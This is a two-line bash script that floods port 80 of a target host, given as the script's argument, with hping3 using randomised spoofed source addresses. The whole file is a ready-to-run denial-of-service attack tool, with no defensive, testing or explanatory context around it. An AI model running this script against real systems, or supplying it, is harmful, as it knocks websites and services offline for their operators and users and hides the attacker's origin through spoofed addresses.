#!/bin/bash
sudo hping3 --flood -p 80 --rand-source "$1"
